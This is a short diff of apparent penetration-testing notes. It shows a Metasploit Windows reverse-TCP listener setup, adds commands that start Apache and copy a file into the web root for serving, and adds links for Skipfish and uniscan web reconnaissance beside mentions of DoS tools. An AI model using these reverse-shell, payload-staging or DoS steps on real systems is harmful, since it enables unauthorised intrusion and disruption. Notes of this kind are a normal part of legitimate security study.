@@ -404,6 +404,10 @@ Windows Reverse tcp
            set LHOST 172.16.104.130
            set LPORT 31337
            exploit
+             
+             service apache2 start
+             cp /root/Desktop/abc.txt /var/www/html/share/
+             
            
 
            
@@ -420,6 +424,21 @@ DoS
              https://linuxhint.com/hping3/
              
              HOIC in Windows
+             
+             
+Skipfish
+             
+             Recon on web servers
+             
+             https://tools.kali.org/web-applications/skipfish#:~:text=Skipfish%20is%20an%20active%20web,non%2Ddisruptive)%20security%20checks.
+             
+             On windows   HTTP recon | ID Serve
+             
+             https://tools.kali.org/web-applications/uniscan
+             
+             
+             
+             
              
         
 
